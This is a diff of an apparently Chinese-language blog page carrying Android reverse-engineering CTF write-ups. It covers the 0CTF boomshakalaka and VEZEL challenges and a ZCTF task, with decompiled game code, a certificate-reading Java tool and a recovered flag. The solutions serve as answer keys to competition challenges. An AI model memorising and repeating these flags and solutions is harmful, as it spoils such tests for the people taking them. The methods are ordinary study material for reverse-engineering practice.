+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">100</span> )</div><div class="line">    &#123;</div><div class="line">      v6 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v22, &amp;v20, <span class="string">"MW"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v6, &amp;v34, &amp;v22);</div><div class="line">      v7 = &amp;v22;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">600</span> )</div><div class="line">    &#123;</div><div class="line">      v8 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v23, &amp;v20, <span class="string">"Rf"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v8, &amp;v34, &amp;v23);</div><div class="line">      v7 = &amp;v23;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">700</span> )</div><div class="line">    &#123;</div><div class="line">      v9 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v24, &amp;v20, <span class="string">"Rz"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v9, &amp;v34, &amp;v24);</div><div class="line">      v7 = &amp;v24;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">3000</span> )</div><div class="line">    &#123;</div><div class="line">      v10 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v25, &amp;v20, <span class="string">"Bt"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v10, &amp;v34, &amp;v25);</div><div class="line">      v7 = &amp;v25;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">5600</span> )</div><div class="line">    &#123;</div><div class="line">      v11 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v26, &amp;v20, <span class="string">"RV"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v11, &amp;v34, &amp;v26);</div><div class="line">      v7 = &amp;v26;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">9900</span> )</div><div class="line">    &#123;</div><div class="line">      v12 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v27, &amp;v20, <span class="string">"9Z"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v12, &amp;v34, &amp;v27);</div><div class="line">      v7 = &amp;v27;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">18000</span> )</div><div class="line">    &#123;</div><div class="line">      v13 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v28, &amp;v20, <span class="string">"b1"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v13, &amp;v34, &amp;v28);</div><div class="line">      v7 = &amp;v28;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">88800</span> )</div><div class="line">    &#123;</div><div class="line">      v14 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v29, &amp;v20, <span class="string">"Vf"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v14, &amp;v34, &amp;v29);</div><div class="line">      v7 = &amp;v29;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">100000</span> )</div><div class="line">    &#123;</div><div class="line">      v15 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v30, &amp;v20, <span class="string">"S2"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v15, &amp;v34, &amp;v30);</div><div class="line">      v7 = &amp;v30;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( v3 != (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">1000000000</span> )</div><div class="line">      &#123;</div><div class="line">LABEL_25:</div><div class="line">        v17 = cocos2d::CCString::createWithFormat((cocos2d::CCString *)<span class="string">"%d"</span>, v3);</div><div class="line">        (*(<span class="keyword">void</span> (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(v18 + <span class="number">264</span>) + <span class="number">428</span>))(</div><div class="line">          *(_DWORD *)(v18 + <span class="number">264</span>),</div><div class="line">          *(_DWORD *)(v17 + <span class="number">20</span>));</div><div class="line">        <span class="keyword">return</span> sub_3A1DDC(&amp;v20);</div><div class="line">      &#125;</div><div class="line">      v16 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v31, &amp;v20, <span class="string">"4w"</span>);</div></pre></td></tr></table></figure>
+<p>打上一局游戏, root权限查看sharedpreference, 可以发现部分flag:MGN0ZntDMGNvUzJkX0FuRHJv<strong>MWRf</strong>dz99</p>
+<p>注意加粗的地方是与分数先关的, 其余的或许与前面或许与后面有关, 我们不敢确定, 但是我们可以把缺少的分数部分补全.MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99, 解码得到0ctf{C0coS2d_AnDro1d_G0mE_YoU_Kn0w?}.</p>
+<h2 id="Other-write-ups-and-resources"><a href="#Other-write-ups-and-resources" class="headerlink" title="Other write-ups and resources"></a>Other write-ups and resources</h2><ul>
+<li><a href="https://eugenekolo.com/blog/0ctf-2016-boomshakalaka-writeup/" target="_blank" rel="external">https://eugenekolo.com/blog/0ctf-2016-boomshakalaka-writeup/</a></li>
+<li><a href="https://github.com/p4-team/ctf/blob/master/2016-03-12-0ctf/boomshakalaka/README.md" target="_blank" rel="external">P4 Team</a></li>
 </ul>
 
+          
+        
+      
+    </div>
+    
+    
+    
 
-        <!-- Sidebar Footer -->
-        <!--
-I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
-If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
-It will not impact the appearance and can give developers a lot of support :)
+    
 
-很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
-如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
-它不会影响美观并可以给开发者很大的支持和动力。 :)
--->
+    
 
-<!-- Sidebar Divider -->
+    
 
-    <div class="sidebar-divider"></div>
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
 
 
-<!-- Theme Material -->
+    
+      
 
-    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
-        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
-            Theme - Material
-            <span class="sidebar-badge badge-circle">i</span>
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/VEZEL100/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/VEZEL100/" itemprop="url">0CTF 2015 Quals CTF VEZEL</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T16:49:43+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
         </div>
-    </a>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p># </p>
+<p><strong>Category:</strong> Mobile<br><strong>Points:</strong> 100<br><strong>Solves:</strong> 105<br><strong>Description:</strong> </p>
+<blockquote>
+<p>Evermars says he is good at repackaging Android applications, for <a href="vezel.apk">example</a>.</p>
+</blockquote>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h2><p>分析过程可以参考下面三个链接, 程序很简单flag由两个字符串相加内容计算, 其中一个getCRC可以直接得到, 而apk签名可以用Main.class运行得到, 比较笨的办法是自己写一个apk, 利用PackageManager得到签名.</p>
+<h2 id="Other-write-ups-and-resources"><a href="#Other-write-ups-and-resources" class="headerlink" title="Other write-ups and resources"></a>Other write-ups and resources</h2><ul>
+<li><a href="http://capturetheswag.blogspot.com.au/2015/03/0ops-ctf-qualifiers-2015-vezel-mobile.html" target="_blank" rel="external">http://capturetheswag.blogspot.com.au/2015/03/0ops-ctf-qualifiers-2015-vezel-mobile.html</a></li>
+<li><a href="http://dakutenpura.hatenablog.com/entry/2015/03/31/002551" target="_blank" rel="external">http://dakutenpura.hatenablog.com/entry/2015/03/31/002551</a></li>
+<li><a href="http://www.purpleroc.com/MD/0ctf_WriteUp_vezel.html" target="_blank" rel="external">http://www.purpleroc.com/MD/0ctf_WriteUp_vezel.html</a></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.lang.ref.WeakReference;</div><div class="line"><span class="keyword">import</span> java.security.Signature;</div><div class="line"><span class="keyword">import</span> java.security.cert.*;</div><div class="line"><span class="keyword">import</span> java.util.Enumeration;</div><div class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</div><div class="line"><span class="keyword">import</span> java.util.jar.JarFile;</div><div class="line"><span class="keyword">import</span> java.util.logging.Level;</div><div class="line"><span class="keyword">import</span> java.util.logging.Logger;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</div><div class="line"> </div><div class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object mSync = <span class="keyword">new</span> Object();</div><div class="line"> <span class="keyword">private</span> <span class="keyword">static</span> WeakReference&lt;<span class="keyword">byte</span>[]&gt; mReadBuffer;</div><div class="line"> </div><div class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">  <span class="keyword">if</span> (args.length &lt; <span class="number">1</span>) &#123;</div><div class="line">   System.out.println(<span class="string">"Usage: java -jar GetAndroidSig.jar &lt;apk/jar&gt;"</span>);</div><div class="line">   System.exit(-<span class="number">1</span>);</div><div class="line">  &#125;</div><div class="line"> </div><div class="line">  System.out.println(args[<span class="number">0</span>]);</div><div class="line"> </div><div class="line">  String mArchiveSourcePath = args[<span class="number">0</span>];</div><div class="line"> </div><div class="line">  WeakReference&lt;<span class="keyword">byte</span>[]&gt; readBufferRef;</div><div class="line">  <span class="keyword">byte</span>[] readBuffer = <span class="keyword">null</span>;</div><div class="line">  <span class="keyword">synchronized</span> (mSync) &#123;</div><div class="line">   readBufferRef = mReadBuffer;</div><div class="line">   <span class="keyword">if</span> (readBufferRef != <span class="keyword">null</span>) &#123;</div><div class="line">    mReadBuffer = <span class="keyword">null</span>;</div><div class="line">    readBuffer = readBufferRef.get();</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">if</span> (readBuffer == <span class="keyword">null</span>) &#123;</div><div class="line">    readBuffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</div><div class="line">    readBufferRef = <span class="keyword">new</span> WeakReference&lt;<span class="keyword">byte</span>[]&gt;(readBuffer);</div><div class="line">   &#125;</div><div class="line">  &#125;</div><div class="line"> </div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">   JarFile jarFile = <span class="keyword">new</span> JarFile(mArchiveSourcePath);</div><div class="line">   java.security.cert.Certificate[] certs = <span class="keyword">null</span>;</div><div class="line"> </div><div class="line">   Enumeration entries = jarFile.entries();</div><div class="line">   <span class="keyword">while</span> (entries.hasMoreElements()) &#123;</div><div class="line">    JarEntry je = (JarEntry) entries.nextElement();</div><div class="line">    <span class="keyword">if</span> (je.isDirectory()) &#123;</div><div class="line">     <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (je.getName().startsWith(<span class="string">"META-INF/"</span>)) &#123;</div><div class="line">     <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    java.security.cert.Certificate[] localCerts = loadCertificates(jarFile, je, readBuffer);</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">false</span>) &#123;</div><div class="line">     System.out.println(<span class="string">"File "</span> + mArchiveSourcePath + <span class="string">" entry "</span> + je.getName()</div><div class="line">         + <span class="string">": certs="</span> + certs + <span class="string">" ("</span></div><div class="line">         + (certs != <span class="keyword">null</span> ? certs.length : <span class="number">0</span>) + <span class="string">")"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (localCerts == <span class="keyword">null</span>) &#123;</div><div class="line">     System.err.println(<span class="string">"Package has no certificates at entry "</span></div><div class="line">         + je.getName() + <span class="string">"; ignoring!"</span>);</div><div class="line">     jarFile.close();</div><div class="line">     <span class="keyword">return</span>;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (certs == <span class="keyword">null</span>) &#123;</div><div class="line">     certs = localCerts;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">     <span class="comment">// Ensure all certificates match.</span></div><div class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; certs.length; i++) &#123;</div><div class="line">      <span class="keyword">boolean</span> found = <span class="keyword">false</span>;</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; localCerts.length; j++) &#123;</div><div class="line">       <span class="keyword">if</span> (certs[i] != <span class="keyword">null</span></div><div class="line">           &amp;&amp; certs[i].equals(localCerts[j])) &#123;</div><div class="line">        found = <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">       &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span> (!found || certs.length != localCerts.length) &#123;</div><div class="line">       System.err.println(<span class="string">"Package has mismatched certificates at entry "</span></div><div class="line">           + je.getName() + <span class="string">"; ignoring!"</span>);</div><div class="line">       jarFile.close();</div><div class="line">       <span class="keyword">return</span>; <span class="comment">// false</span></div><div class="line">      &#125;</div><div class="line">     &#125;</div><div class="line">    &#125;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   jarFile.close();</div><div class="line"> </div><div class="line">   <span class="keyword">synchronized</span> (mSync) &#123;</div><div class="line">    mReadBuffer = readBufferRef;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="keyword">if</span> (certs != <span class="keyword">null</span> &amp;&amp; certs.length &gt; <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">final</span> <span class="keyword">int</span> N = certs.length;</div><div class="line">     </div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</div><div class="line">     String charSig = <span class="keyword">new</span> String(toChars(certs[i].getEncoded()));</div><div class="line">     System.out.println(<span class="string">"Cert#: "</span> + i + <span class="string">"  Type:"</span> + certs[i].getType()</div><div class="line">      + <span class="string">"\nPublic key: "</span> + certs[i].getPublicKey()</div><div class="line">      + <span class="string">"\nHash code: "</span> + certs[i].hashCode()</div><div class="line">       + <span class="string">" / 0x"</span> + Integer.toHexString(certs[i].hashCode())</div><div class="line">      + <span class="string">"\nTo char: "</span> + charSig);</div><div class="line">    &#125;</div><div class="line">   &#125; <span class="keyword">else</span> &#123;</div><div class="line">    System.err.println(<span class="string">"Package has no certificates; ignoring!"</span>);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">   &#125;</div><div class="line">  &#125; <span class="keyword">catch</span> (CertificateEncodingException ex) &#123;</div><div class="line">   Logger.getLogger(Main.class.getName()).log(Level.SEVERE, <span class="keyword">null</span>, ex);</div><div class="line">  &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">   System.err.println(<span class="string">"Exception reading "</span> + mArchiveSourcePath + <span class="string">"\n"</span> + e);</div><div class="line">   <span class="keyword">return</span>;</div><div class="line">  &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</div><div class="line">   System.err.println(<span class="string">"Exception reading "</span> + mArchiveSourcePath + <span class="string">"\n"</span> + e);</div><div class="line">   <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"> &#125;</div><div class="line"> </div><div class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">char</span>[] toChars(<span class="keyword">byte</span>[] mSignature) &#123;</div><div class="line">    <span class="keyword">byte</span>[] sig = mSignature;</div><div class="line">    <span class="keyword">final</span> <span class="keyword">int</span> N = sig.length;</div><div class="line">    <span class="keyword">final</span> <span class="keyword">int</span> N2 = N*<span class="number">2</span>;</div><div class="line">    <span class="keyword">char</span>[] text = <span class="keyword">new</span> <span class="keyword">char</span>[N2];</div><div class="line"> </div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;N; j++) &#123;</div><div class="line">      <span class="keyword">byte</span> v = sig[j];</div><div class="line">      <span class="keyword">int</span> d = (v&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>;</div><div class="line">      text[j*<span class="number">2</span>] = (<span class="keyword">char</span>)(d &gt;= <span class="number">10</span> ? (<span class="string">'a'</span> + d - <span class="number">10</span>) : (<span class="string">'0'</span> + d));</div><div class="line">      d = v&amp;<span class="number">0xf</span>;</div><div class="line">      text[j*<span class="number">2</span>+<span class="number">1</span>] = (<span class="keyword">char</span>)(d &gt;= <span class="number">10</span> ? (<span class="string">'a'</span> + d - <span class="number">10</span>) : (<span class="string">'0'</span> + d));</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    <span class="keyword">return</span> text;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line"> <span class="keyword">private</span> <span class="keyword">static</span> java.security.cert.Certificate[] loadCertificates(JarFile jarFile, JarEntry je, <span class="keyword">byte</span>[] readBuffer) &#123;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">   <span class="comment">// We must read the stream for the JarEntry to retrieve</span></div><div class="line">   <span class="comment">// its certificates.</span></div><div class="line">   InputStream is = jarFile.getInputStream(je);</div><div class="line">   <span class="keyword">while</span> (is.read(readBuffer, <span class="number">0</span>, readBuffer.length) != -<span class="number">1</span>) &#123;</div><div class="line">    <span class="comment">// not using</span></div><div class="line">   &#125;</div><div class="line">   is.close();</div><div class="line"> </div><div class="line">   <span class="keyword">return</span> (java.security.cert.Certificate[]) (je != <span class="keyword">null</span> ? je.getCertificates() : <span class="keyword">null</span>);</div><div class="line">  &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">   System.err.println(<span class="string">"Exception reading "</span> + je.getName() + <span class="string">" in "</span></div><div class="line">       + jarFile.getName() + <span class="string">": "</span> + e);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
 
 
-<!-- Help & Support -->
-<!--
+    
+      
 
--->
+  
 
-<!-- Feedback -->
-<!--
+  
+  
+  
 
--->
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/zctf-android-1/">
 
-<!-- About Theme -->
-<!--
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
 
--->
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/zctf-android-1/" itemprop="url">ZCTF Android 1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T16:49:43+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>先做笔记,最后整理成题解.</p>
+<p>首先对APK的Java层代码进行分析.入口的逻辑在Login.attemptLogin函数中该函数调用Auth.auth对用户名密码进行校验.</p>
+<p><img src="image/1.png" alt="1"></p>
+<p>此处校验有一个读取数据库的函数databaseopt,其逻辑就在下边定义,但是其实不用看,key.db文件就在程序目录中,用随便一个数据库查看器可以看到唯一的键值</p>
+<p><img src="image/2.png" alt="2"></p>
+<p>所以,auth函数参数0=context,1=yonghuming+mima,2=”zctf2016”<br>下面分析Auth和auth逻辑.</p>
+<p><img src="image/3.png" alt="3"></p>
+<p>Auth有auth,encrypt和decrypt三个函数,后二者是des加解密.auth的逻辑恢复的有些混乱,分析得到黄色部分需要与apk资源中的flag.bin内容进行比较.用python对flag.bin进行des解密还原.盗用程序自带的DES解密,得到结果</p>
